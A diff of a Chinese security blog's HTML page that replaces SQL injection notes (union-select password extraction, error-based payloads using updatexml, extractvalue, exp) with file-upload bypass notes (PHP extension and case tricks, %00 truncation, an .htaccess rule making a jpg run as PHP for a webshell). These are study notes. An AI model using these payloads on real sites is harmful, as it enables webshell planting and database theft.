@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入笔记, Niko blog">
+    <meta name="keywords" content="文件上传绕过, Niko blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入笔记 | Niko blog</title>
+    <title>文件上传绕过 | Niko blog</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -266,7 +266,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入笔记</h1>
+                    <h1 class="description center-align post-title">文件上传绕过</h1>
                 </div>
             </div>
         </div>
@@ -382,8 +382,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">
+                                <span class="chip bg-color">文件上传绕过</span>
                             </a>
                         
                     </div>
@@ -407,28 +407,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-30
+                    2021-10-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-01
+                    2021-10-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    771
+                    423
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    1 分
                 </div>
                 
 
@@ -451,147 +451,35 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h5 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h5><p>可以去网站查看 <a target="_blank" rel="noopener" href="https://owasp.org/Top10/">OWASP 前 10：2021</a></p>
-<h4 id="SQL常用函数"><a href="#SQL常用函数" class="headerlink" title="SQL常用函数"></a>SQL常用函数</h4><table>
-<thead>
-<tr>
-<th align="center">函数名称</th>
-<th align="center">函数说明及使用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">MID（要截取的字符串，起始位置，结束位置）</td>
-<td align="center">截取字符串</td>
-</tr>
-<tr>
-<td align="center">CHAR(ASCII)</td>
-<td align="center">返回ASCII码对应的字符</td>
-</tr>
-<tr>
-<td align="center">ASCII(字符)</td>
-<td align="center">返回字符对应的ASCII码</td>
-</tr>
-<tr>
-<td align="center">IF(逻辑表达式,返回1，2)</td>
-<td align="center">if</td>
-</tr>
-<tr>
-<td align="center">SUBSTR（同MID）</td>
-<td align="center">同MID</td>
-</tr>
-<tr>
-<td align="center">LENGTH（字符串）</td>
-<td align="center">返回字符串长度</td>
-</tr>
-<tr>
-<td align="center">COUT(列名)</td>
-<td align="center">返回当前列名下有效记录数</td>
-</tr>
-<tr>
-<td align="center">SLEEP(s)</td>
-<td align="center">沉睡XXX秒，数字类型，可自定义</td>
-</tr>
-<tr>
-<td align="center">#  /**/  –</td>
-<td align="center">–+</td>
-</tr>
-<tr>
-<td align="center">CONCAT(字符串1，字符串2…)</td>
-<td align="center">拼接字符</td>
-</tr>
-<tr>
-<td align="center">LOAD_FILE（文件名）</td>
-<td align="center">读取文件</td>
-</tr>
-<tr>
-<td align="center">INTO OUTFILE “文件名称”</td>
-<td align="center">输出</td>
-</tr>
-</tbody></table>
-<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>u xxx <span class="token operator">-</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="文件上传绕过笔记"><a href="#文件上传绕过笔记" class="headerlink" title="文件上传绕过笔记"></a>文件上传绕过笔记</h2><h3 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h3><pre class="line-numbers language-none"><code class="language-none">文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。
+文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h4 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>h host <span class="token operator">-</span>u username <span class="token operator">-</span>p password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="常规绕过"><a href="#常规绕过" class="headerlink" title="常规绕过"></a>常规绕过</h3><pre class="line-numbers language-none"><code class="language-none">.php3 .php4 .php5 .php6 .php7 .phps .phpt .phtml
+&#x2F;&#x2F;都可以当作php去执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h5><p>SQL注入分类：</p>
-<ul>
-<li>回显正常—&gt; 联合查询 union select</li>
-<li>回显报错—&gt; Duplicate entry()<pre><code>       extractvalue()
-</code></pre>
-  　　       updatexml()</li>
-<li>盲注    —&gt;布尔型盲注<pre><code>       基于时间的盲注sleep()
-</code></pre>
-</li>
-</ul>
-<h5 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token keyword">status</span><span class="token punctuation">;</span> <span class="token comment">/*(order by x)*/</span><span class="token comment">--列</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*0,password,0*/</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>xxx<span class="token punctuation">;</span><span class="token comment">/*跨库 要root*/</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> xxxx <span class="token keyword">from</span> xxxx<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment">/*表名*/</span> <span class="token keyword">from</span> <span class="token comment">/*库名*/</span><span class="token keyword">tables</span>
-<span class="token comment">/* 
-   例子 
-       select table_schema from information_schema.tables
-      
-       union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB'
-       解析：从information_scheam数据库的table_schema列名获取jokerDB 在进行约束 
-	   union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB' and tabke_name='uers'
-       查询你认为可能像密码的表
-*/</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> xxx<span class="token punctuation">;</span><span class="token comment">/*字符填充 防止报错*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre class="line-numbers language-none"><code class="language-none">.PHP .PHPTML ......等等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查看版本</span>
-<span class="token keyword">set</span> xxxx gdk <span class="token comment">//编码 首先的知道编码</span>
-<span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span> <span class="token comment">//查看数据库</span>
-<span class="token keyword">create</span> datase test<span class="token punctuation">;</span> <span class="token comment">//新建数据库test</span>
-<span class="token keyword">use</span> test<span class="token punctuation">;</span> <span class="token comment">//使用数据库</span>
-<span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment">//查看表</span>
-<span class="token comment">// 创建表</span>
-<span class="token keyword">create</span> <span class="token keyword">table</span> xxxx<span class="token punctuation">(</span>id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span> username <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>password <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token keyword">primary</span> ker<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//查看字段类型</span>
-<span class="token keyword">show</span> <span class="token keyword">full</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span>
-<span class="token comment">//插入数据</span>
-<span class="token keyword">insert</span> <span class="token keyword">into</span> xxxx<span class="token punctuation">(</span>username<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>
-<span class="token comment">//查看数据</span>
-<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> xxxx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><pre class="line-numbers language-none"><code class="language-none">pphphp 
+&#x2F;&#x2F;后端会删除一个php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><h5 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//常规注入 </span>
-php? id<span class="token operator">=</span><span class="token number">1</span>
-php? id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
-?id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">or</span> <span class="token string">'s'</span><span class="token operator">=</span><span class="token string">'s'</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h3><pre class="line-numbers language-none"><code class="language-none">file.jpg -&gt; file.php
+&#x2F;&#x2F;bp抓包更改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//联合注入</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span>
+<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h3><pre class="line-numbers language-none"><code class="language-none">.htaccess
+&lt;FilesMatch &quot;shell.jpg&quot;&gt;
+  SetHandler application&#x2F;x-httpd-php
+&lt;&#x2F;FilesMatch&gt;
+&#x2F;&#x2F;上传两个文件，把jpg当成php去执行
+shell.jpg -&gt; 一句话<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
+<h3 id="文件执行绕过"><a href="#文件执行绕过" class="headerlink" title="文件执行绕过"></a>文件执行绕过</h3><pre class="line-numbers language-none"><code class="language-none">file.jpg &#x3D;&gt; JPG
+shell
+&#x2F;&#x2F;和.htaccess组合拳
+?file&#x3D;file.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx 列名<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
+<h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><pre class="line-numbers language-none"><code class="language-none">shell.php%00.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">exists</span><span class="token punctuation">(</span>xxxx username <span class="token keyword">from</span> admin<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="常用十大报错函数"><a href="#常用十大报错函数" class="headerlink" title="常用十大报错函数"></a>常用十大报错函数</h5><h6 id="1-floor"><a href="#1-floor" class="headerlink" title="1. floor()"></a>1. floor()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sel <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2. extractvalue()"></a>2. extractvalue()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3. updatexml()"></a>3. updatexml()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4.geometrycollection()"></a>4.geometrycollection()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5. multipoint()"></a>5. multipoint()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6. polygon()"></a>6. polygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7.multipolygon()"></a>7.multipolygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8.linestring()"></a>8.linestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9.multilinestring()"></a>9.multilinestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="10-exp"><a href="#10-exp" class="headerlink" title="10.exp()"></a>10.exp()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx' <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
+<h3 id="欢迎各位在补充其他"><a href="#欢迎各位在补充其他" class="headerlink" title="欢迎各位在补充其他"></a>欢迎各位在补充其他</h3>
                 
             </div>
             <hr/>
@@ -617,7 +505,7 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://stentqh.github.io/2021/09/30/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">http://stentqh.github.io/2021/09/30/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a>
+                    <a href="http://stentqh.github.io/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">http://stentqh.github.io/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -655,8 +543,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">
+                                    <span class="chip bg-color">文件上传绕过</span>
                                 </a>
                             
                         </div>
@@ -972,31 +860,31 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/09/30/HTTP%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/">
+                <a href="/2021/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84csrf%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="HTTP协议笔记">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="记一次pikachu靶场的csrf漏洞">
                         
-                        <span class="card-title">HTTP协议笔记</span>
+                        <span class="card-title">记一次pikachu靶场的csrf漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            有关HTTP协议的知识
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-11
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category">
-                                    计算机基础
+                            <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category">
+                                    靶场
                                 </a>
                             
                             
@@ -1006,8 +894,12 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HTTP%E5%8D%8F%E8%AE%AE/">
-                        <span class="chip bg-color">HTTP协议</span>
+                    <a href="/tags/csrf/">
+                        <span class="chip bg-color">csrf</span>
+                    </a>
+                    
+                    <a href="/tags/pikachu/">
+                        <span class="chip bg-color">pikachu</span>
